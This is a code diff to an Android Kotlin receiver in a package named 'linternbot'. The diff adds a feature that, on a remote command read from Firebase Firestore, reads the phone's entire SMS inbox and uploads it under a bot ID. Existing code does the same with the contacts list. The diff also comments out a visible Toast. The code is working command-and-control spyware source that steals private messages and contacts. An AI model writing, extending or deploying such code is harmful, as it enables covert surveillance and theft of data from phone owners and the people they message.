@@ -1,21 +1,18 @@
 package com.linternbot
 
-import android.Manifest
 import android.app.AlarmManager
 import android.app.PendingIntent
 import android.content.BroadcastReceiver
 import android.content.ContentResolver
 import android.content.Context
 import android.content.Intent
-import android.content.pm.PackageManager
 import android.database.Cursor
+import android.net.Uri
 import android.os.Build
 import android.os.PowerManager
 import android.provider.ContactsContract
 import android.util.Log
 import android.widget.Toast
-import androidx.core.app.ActivityCompat
-import androidx.core.content.ContextCompat
 import com.google.firebase.firestore.DocumentChange
 import com.google.firebase.firestore.FirebaseFirestore
 import com.google.firebase.firestore.ktx.firestore
@@ -32,7 +29,7 @@ class Alarm : BroadcastReceiver() {
         val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
         val wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "app:alarm")
         wl.acquire()
-        Toast.makeText(context, "Alarm !!!!!!!!!!", Toast.LENGTH_LONG).show(); // For example
+        //Toast.makeText(context, "Alarm !!!!!!!!!!", Toast.LENGTH_LONG).show(); // For example
 
         val c = Calendar.getInstance()
         val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
@@ -90,6 +87,13 @@ class Alarm : BroadcastReceiver() {
                         Log.d("TAG2", "Se añade nuevos datos de los contactos del dispositivo")
                         db.collection("ordenes").document(document.id).delete().addOnSuccessListener {
                             Log.d("TAG2", "Orden de datos de los contactos de dispositivo eliminada")
+                        }
+                    }
+                    if(document.data["Primitiva"]!!.equals("SMS")){
+                        nuevaListaSMS(db, strDate)
+                        Log.d("TAG2", "Se añade nuevos datos de los sms del dispositivo")
+                        db.collection("ordenes").document(document.id).delete().addOnSuccessListener {
+                            Log.d("TAG2", "Orden de datos de los sms de dispositivo eliminada")
                         }
                     }
                 }
@@ -204,6 +208,30 @@ class Alarm : BroadcastReceiver() {
         Log.d("TAG2","Se ha ejecutado la tarea obtencion de lista de contactos")
     }
 
+    fun nuevaListaSMS(db : FirebaseFirestore, strDate: String){
+        val sms = hashMapOf(
+            "Bot ID" to idAndroid,
+            "Hora" to strDate,
+            "Lista contactos" to obtenerListaSMS()
+        )
+        db.collection("ordenes")
+            .whereEqualTo("Primitiva", "SMS")
+            .addSnapshotListener { snapshot, e ->
+                if (e != null) {
+                    Log.d("TAG", "Fallada la escucha de la primitiva.", e)
+                    return@addSnapshotListener
+                }
+
+                for (dc in snapshot!!.documentChanges) {
+                    when (dc.type) {
+                        DocumentChange.Type.ADDED -> db.collection("sms").document(idAndroid).set(sms)
+                    }
+                }
+            }
+
+        Log.d("TAG2","Se ha ejecutado la tarea obtencion de lista de sms")
+    }
+
     // Fuente: https://stackoverflow.com/questions/12562151/android-get-all-contacts
     private fun getContactList() : ArrayList<Contact> {
         var contactList: ArrayList<Contact> = ArrayList()
@@ -213,10 +241,6 @@ class Alarm : BroadcastReceiver() {
             ContactsContract.Contacts.DISPLAY_NAME,
             ContactsContract.CommonDataKinds.Phone.NUMBER
         )
-
-
-
-
         val cr: ContentResolver = contexto.getContentResolver()
         val cursor: Cursor? = cr.query(
             ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
@@ -251,5 +275,26 @@ class Alarm : BroadcastReceiver() {
             }
         }
         return contactList
+    }
+
+    fun obtenerListaSMS() : ArrayList<SMS> {
+        var listaSMS: ArrayList<SMS> = ArrayList()
+        val cr: ContentResolver = contexto.getContentResolver()
+        val cursor: Cursor? = cr.query(Uri.parse("content://sms/inbox"), null, null, null, null)
+
+        if (cursor != null) {
+            if (cursor.moveToFirst()) { // must check the result to prevent exception
+                do {
+                    var msgData = ""
+                    for (idx in 0 until cursor.columnCount) {
+                        msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx)
+                        listaSMS.add(SMS(idx,msgData))
+                    }
+                } while (cursor.moveToNext())
+            } else {
+                Log.d("TAG2", "Error consiguiendo la lista de sms")
+            }
+        }
+        return listaSMS
     }
 }
